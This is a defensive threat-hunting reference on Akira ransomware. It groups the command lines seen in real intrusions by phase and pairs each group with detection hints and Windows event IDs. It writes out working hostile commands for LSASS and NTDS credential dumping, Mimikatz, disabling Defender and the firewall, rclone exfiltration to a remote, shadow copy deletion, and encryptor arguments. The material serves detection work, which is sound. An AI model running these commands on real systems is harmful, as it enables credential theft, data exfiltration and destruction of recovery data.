# Akira Ransomware — Command Patterns

**Document type:** Artifact — Command & Execution Pattern Reference  
**Project:** Akira Ransomware Threat Hunting  
**Sources:** CISA AA24-109A (updated Nov 2025), Sophos MDR, Unit 42 (Howling Scorpius), IBM X-Force, AttackIQ

**Focus:** Command-level patterns observed in real incidents, intended for detection and investigation support.

**Use alongside:**
- `artifacts/raw_artifacts.md` → observable evidence per phase
- `analysis/attack_timeline.md` → sequence and timing context
- `intel/ttp_table.md` → MITRE ATT&CK mapping

---

## Overview

Akira operators rely heavily on native Windows tools (LOLBins), a small set of trusted dual-use utilities, and PowerShell. The intrusion sequence is consistent across incidents: get in via VPN or RDP, dump credentials, move laterally, stage and exfiltrate data, then encrypt. The window between initial access and encryption has been as short as two hours.

This document covers the command-line patterns that actually show up during Akira intrusions, grouped by phase.

---

## 1. Initial Foothold & Persistence

After gaining access — typically via compromised VPN credentials, RDP brute force, or CVE exploitation — operators quickly establish a local admin account for a dedicated foothold.

```
Command:
net user itadm [password] /add
net localgroup administrators itadm /add

Purpose:
Create a new local admin account as a persistent foothold.

Notes:
- Account name varies (itadm, svcadmin, and similar IT-themed names are documented)
- Creating a fresh account is preferred over hijacking an existing one — it survives password resets on the original victim account
- Rapid sequence between these two commands (seconds to minutes) is the detection signal — not the name itself
- This pattern is also emulated in the AttackIQ AA24-109A attack graph (Nov 2025)
```

---

## 2. Reconnaissance

Reconnaissance happens right after persistence is established. Operators use a mix of built-in Windows commands and lightweight network scanners.

### Domain and Trust Discovery

```
Command:
nltest /dclist:
nltest /DOMAIN_TRUSTS
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

Purpose:
Identify domain controllers and trust relationships.

Notes:
- Tells the operator what to target for AD credential dumping
- nltest calls are explicitly called out in the CISA Nov 2025 advisory as high-confidence indicators
- Running from a non-admin workstation context makes these high signal
```

### Local Enumeration

```
Command:
whoami /all
net localgroup administrators

Purpose:
Confirm current user privileges and local admin membership.

Notes:
- Usually among the first commands in an interactive session
- The velocity of these commands alongside others is the signal — not individual execution
```

### Network Scanning

```
Command:
[Tools: SoftPerfect Network Scanner, Advanced IP Scanner, NetScan — run interactively]

Purpose:
Identify reachable internal hosts before lateral movement.

Notes:
- Tools are dropped and executed from user-writable paths
- NetFlow artifact (one host sweeping many IPs on 445/3389/22) is more reliable than binary detection alone
```

### Remote Directory Listing

```
Command:
dir "\\10.1.x.x\c$\ProgramData" >> C:\ProgramData\HP\svr_dir.txt

Purpose:
Profile file share contents before staging exfiltration.

Notes:
- Seen delivered via scheduled task disguised as "Windows Update" (Sophos MDR)
- Avoids interactive sessions that are more likely to generate alerts
- Output file path in C:\ProgramData is typical staging behavior
```

### Drive Enumeration

```
Command:
fsutil fsinfo drives

Purpose:
Identify all local and mapped drives before encryption begins.

Notes:
- Low-noise command on its own
- Significant when correlated with other pre-encryption indicators in the same session window
```

---

## 3. Credential Access

Akira doesn't just dump LSASS and move on. In many incidents they go after the full AD database and, where Veeam is present, backup credentials as well.

### LSASS Memory Dump via comsvcs.dll

```
Command:
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump [LSASS_PID] C:\Windows\Temp\lsass.dmp full

Purpose:
Dump LSASS memory using a built-in Windows DLL — no external tooling required.

Notes:
- Detection string: comsvcs.dll + MiniDump (or #24, the alternate export alias) in the same command line
- Sysmon EID 10 (ProcessAccess on lsass.exe from rundll32.exe) is the primary detection event
- When you see this, assume credentials are already stolen — escalate quickly

Detection hint:
Alert on rundll32.exe with comsvcs.dll in the command line. Cross-check Sysmon EID 10 for lsass.exe as the target. This is rarely legitimate.
```

### Mimikatz

```
Command:
privilege::debug
sekurlsa::logonPasswords
exit

Purpose:
Extract active logon credentials — NTLM hashes and plaintext passwords where available.

Notes:
- privilege::debug requests SeDebugPrivilege, required to read LSASS memory
- sekurlsa::logonPasswords pulls cached session data including hashes
- Typically dropped to a temp directory, sometimes renamed to blend in
- LaZagne is also noted in some incidents for browser and application credentials
```

### NTDS.dit — Active Directory Database Dump

```
Command:
ntdsutil "ac i ntds" "ifm" "create full C:\ProgramData\temp\Crashpad\Temp\abc" q q

Purpose:
Extract the full AD credential database offline without directly touching LSASS.

Notes:
- Creates a portable copy of NTDS.dit and the SYSTEM hive
- The SYSTEM hive is required alongside ntds.dit — password hashes are encrypted with SYSKEY stored in the registry
- C:\ProgramData subdirectories are common staging areas — writable and less scrutinized
```

```
Command:
cmd.exe /c C:\ProgramData\Cl.exe -c -i C:\Windows\NTDS\ntds.dit -o C:\ProgramData\nt.txt
cmd.exe /c C:\ProgramData\Cl.exe -c -i C:\Windows\System32\config\SYSTEM -o C:\ProgramData\s.txt

Purpose:
Parse ntds.dit and SYSTEM hive using a custom dropped tool.

Notes:
- Cl.exe is not a standard Windows binary — it was dropped by the attacker (Sophos-observed)
- Output written to C:\ProgramData — same staging path pattern
- Look for unfamiliar binaries in ProgramData executing against NTDS or SYSTEM paths
```

### Kerberoasting

```
Command:
[No explicit command — Rubeus or Impacket GetUserSPNs used]

Purpose:
Request TGS tickets for SPN-registered accounts and crack them offline.

Notes:
- Does not touch LSASS directly — standard LSASS-based alerts won't fire
- Detection: EID 4769 with TicketEncryptionType = 0x17 (RC4) from a non-service account
- Rapid burst of TGS requests from a single account with no prior baseline is the signal
```

### Veeam Credential Dumping

```
Command:
[Veeam-Get-Creds script via interactive PowerShell ISE]

Purpose:
Extract plaintext domain credentials stored by Veeam Backup & Replication.

Notes:
- Akira consistently targets Veeam servers in environments where they exist
- CVE-2023-27532 was used in at least one incident to access the configuration database directly
- Veeam credentials often have broad domain access — high-value target
```

---

## 4. Lateral Movement

After credential access, operators move to high-value targets: domain controllers, backup servers, ESXi hypervisors.

### RDP with Harvested Credentials

```
Command:
[Standard mstsc.exe or direct RDP session — no custom tooling]

Purpose:
Pivot to domain controllers, file servers, and backup systems using stolen credentials.

Notes:
- Most common lateral movement path once NTLM hashes or plaintext passwords are obtained
- Pass-the-hash is also observed using these credentials
- Detection: EID 4624 (Logon Type 10) from a workstation to a DC with no prior baseline
```

### WMI Remote Execution (Impacket wmiexec)

```
Command:
[Executed remotely — process tree on victim: WmiPrvSE.exe spawning cmd.exe or PowerShell]

Purpose:
Execute commands on remote systems without dropping files on the target.

Notes:
- Agentless and fileless on the target side — no binary is written to the remote host
- The artifact is on the victim: WmiPrvSE.exe spawning a shell is rarely legitimate
- Seen consistently in Akira incidents for initial remote execution on high-value targets
```

### SSH Lateral Movement

```
Command:
ssh [user]@[esxi-host-ip]
plink.exe [user]@[target] -pw [password]

Purpose:
Reach Linux systems and ESXi hypervisors after harvesting credentials.

Notes:
- plink.exe (PuTTY command-line SSH client) observed on Windows systems
- SSH to ESXi is used to deploy Akira_v2 directly on the hypervisor
- Documented in the June 2025 CISA update involving CVE-2024-40766 and Nutanix AHV
- Outbound TCP 22 from a Windows workstation to an internal server is worth alerting
```

### Tunneling and C2

```
Command:
ngrok.exe [tunnel config]
cloudflared.exe tunnel --url [internal-host]

Purpose:
Create encrypted outbound tunnels for persistent C2 access.

Notes:
- Ngrok wraps traffic in HTTPS — passes through most egress filtering
- Detection: DNS queries to *.ngrok.io or *.ngrok-free.app from internal hosts
- This is rarely legitimate in enterprise environments — high-confidence signal regardless of other context
- Cloudflare Tunnel is an alternative with similar characteristics
```

---

## 5. Defense Evasion

Security controls are disabled before running the encryptor or staging large exfiltration.

### Disable Windows Defender

```
Command:
Set-MpPreference -DisableRealtimeMonitoring $true

powershell.exe -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

Purpose:
Disable real-time AV protection before payload execution or data staging.

Notes:
- -ExecutionPolicy Bypass is a common flag to monitor in PowerShell logs
- EID 4104 (Script Block Logging) captures the decoded command even if Base64-encoded
- Some variants use encoded commands to evade basic string detection
```

### Firewall Disable via Registry

```
Command:
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f

Purpose:
Disable the Windows Firewall to allow unrestricted lateral movement or exfiltration.

Notes:
- Registry-based — bypasses some detection rules focused on netsh commands
- Seen alongside Defender disabling in the same session window
```

### EDR Killing — PCHunter64 / POORTRY

```
Command:
PCHunter64.exe [interactive use]
[STONESTOP installs POORTRY — a signed malicious kernel driver]

Purpose:
Terminate or delete EDR/AV processes at kernel level.

Notes:
- PCHunter64 and PowerTool64 expose kernel handles — allow interaction with protected processes
- POORTRY (also tracked as ABYSSWORKER/BurntCigar) is a signed malicious driver used in 2025 Akira incidents
- STONESTOP drops POORTRY; newer variants delete security tool files entirely, not just terminate processes
- HeartCrypt and the Shanya crypter used to obfuscate loaders before delivery
- Detection: Sysmon EID 6 (DriverLoad) from a user-writable directory; anomalous or revoked driver signature

Detection hint:
A signed driver loading from C:\Users\Public\ or C:\Windows\Temp\ should never happen. Any security process termination not tied to a known update or admin action warrants immediate investigation.
```

### ESXi Evasion

```
Command:
[Spin up VM on compromised hypervisor, disable security inside VM, mount host storage, run encryptor from within VM]

Purpose:
Bypass host-level endpoint controls by encrypting from inside a VM the host has no visibility into.

Notes:
- Observed by Sophos MDR — effective against environments relying solely on host-based EDR
- No command-line artifact on the host side — hypervisor management logs are the detection surface
```

---

## 6. Data Staging & Exfiltration

Exfiltration happens before encryption. Data is staged, archived, and transferred — often within hours of initial access.

### Archiving with WinRAR

```
Command:
rar.exe a -r -ep1 C:\ProgramData\exfil.rar [target_directory]

Purpose:
Compress and package data before transfer.

Notes:
- -ep1 strips leading directory paths from archive — reduces artifact footprint
- Archives typically written to C:\ProgramData or C:\Users\Public\
- Large .rar files written to writable paths shortly after a remote session should be investigated
```

### Rclone (Primary Exfil Tool)

```
Command:
rclone copy \\192.168.x.x\sharename$ remote:"/staging/path" \
  --max-age 1y \
  --exclude "*.{exe,dll,mp4,iso,rar,zip,log,tmp,db,lnk,ini,mp3}" \
  -q --ignore-existing --auto-confirm \
  --multi-thread-streams 25 --transfers 25

Purpose:
Sync targeted file shares directly to attacker-controlled cloud storage.

Notes:
- --multi-thread-streams 25 --transfers 25 → up to 625 concurrent connections — aggressive and visible in NetFlow
- Exclusion list targets documents and databases — not binaries or media
- Seen renamed (e.g., svchost.exe) and run from C:\Users\Public\

Detection hint:
rclone.exe (or a renamed binary) executing from outside Program Files is high-confidence. Check for WinRAR/7-Zip archive creation in the same timeframe — staging usually precedes transfer.
```

### WinSCP / FileZilla

```
Command:
[GUI-based SFTP clients — run manually over an RDP session]

Purpose:
Manual or semi-automated file transfer after interactive access.

Notes:
- Both leave MRU registry entries and application config files as forensic artifacts
- In the Unit 42 Nov 2025 incident, close to 1 TB was exfiltrated via FileZillaPortable before encryption
- Look for config files and MRU entries even if the binaries have been deleted
```

### MEGA via Browser / MEGAsync

```
Command:
[Chrome or MEGAsync connecting to MEGA cloud storage IPs]

Purpose:
Exfiltrate data to cloud storage instead of actor-controlled infrastructure.

Notes:
- Harder to block at the perimeter — MEGA is widely whitelisted
- Observed via Chrome network connections to MEGA IP ranges in some incidents
- Large sustained outbound transfers to MEGA during business hours is anomalous
```

---

## 7. Pre-Encryption: Shadow Copy Deletion

Seen consistently across incidents. There is almost no legitimate operational reason for this on a production host.

```
Command:
powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"

powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}"

vssadmin delete shadows /all /quiet

Purpose:
Destroy shadow copies to prevent recovery after encryption.

Notes:
- IBM X-Force confirmed that Akira's encryptor (w.exe) deletes shadow copies via COM objects — it does not spawn vssadmin.exe directly
- Detection rules relying only on vssadmin process creation will miss this
- WMI-based detection rules (EID 4104 for PowerShell, or WMI activity logs) are required for full coverage
- Treat any instance of this on a production host as incident-level — encryption is either imminent or already running

Detection hint:
Alert on Get-WmiObject Win32_ShadowCopy with Remove-WmiObject or .Delete() in the same command. WMI-based shadow copy deletion is the more common observed method — don't rely on vssadmin alone.
```

---

## 8. Ransomware Execution

### Encryptor Arguments — Windows Variant

The encryptor (w.exe, dllhost32.exe, or similar names) accepts runtime arguments:

```
Command:
w.exe -p C:\Users -n 50 -s \\fileserver\share

Purpose:
Encrypt targeted directories and network shares.

Notes:
- -p / --encryption_path → target directory
- -s / --share_file → network share to encrypt
- -n / --encryption_percent → percentage of each file to encrypt (default: 50%)
- --fork → spawn child process for encryption
- -l → log drives to file
- --localonly → skip remote drives
- -e / --exclude → exclude specific paths or extensions
- The -n flag means Akira does not always encrypt 100% of a file — 50% is enough to corrupt while being significantly faster
- Bulk file modification events are a more reliable indicator than waiting for full encryption
```

### Ransom Note

```
Dropped to:
C:\fn.txt
C:\Users\[user]\fn.txt
[Every encrypted directory]

Notes:
- Post-Nov 2025 variants also use akira_readme.txt
- Contains a unique victim code and a .onion URL — no ransom amount is stated
- Notes are dropped into every encrypted directory, not just root
```

---

## Detection Notes

High-signal detection patterns:

| Pattern | Phase | Signal |
|---|---|---|
| `comsvcs.dll` + `MiniDump` or `#24` in the same command | Credential Access | LSASS dump |
| `ntdsutil` + `ifm` + `create full` | Credential Access | AD database dump |
| `rclone.exe` executing outside `Program Files` | Exfiltration | Likely data exfiltration |
| `Get-WmiObject Win32_Shadowcopy` + `Remove-WmiObject` or `.Delete()` | Pre-Encryption | Shadow copy wipe |
| `nltest /dclist:` or `nltest /DOMAIN_TRUSTS` from non-admin workstations | Recon | Early domain discovery |
| `net user [name] /add` → `net localgroup administrators [name] /add` (rapid sequence) | Persistence | Foothold account creation |
| Large outbound on port 22 to non-baseline IPs alongside `rclone` | Exfiltration | Active data exfiltration |
| Sysmon EID 6 (DriverLoad) from user-writable path with anomalous signature | Defense Evasion | POORTRY/EDR kill attempt |
| DNS query to `*.ngrok.io` from internal host | C2 | Tunnel established |
| EID 1102 + EID 104 in the same session window | Defense Evasion | Log clearing — pre-encryption |

Shadow copy deletion and rclone execution are particularly high-fidelity. There is very little legitimate reason for either outside of scheduled, documented backup jobs. Treat them as incident-level when correlated with other signals from the same session window.

---

*Sources: CISA AA24-109A (Apr 2024, updated Nov 2025) · Sophos MDR — "Akira, again" (Dec 2023) · Sophos — "Bringin' 1988 Back" (May 2023) · Unit 42 — Howling Scorpius Threat Assessment (Nov 2025) · IBM X-Force Spotlight on Akira (2023) · AttackIQ Emulation Report AA24-109A (Nov 2025)*
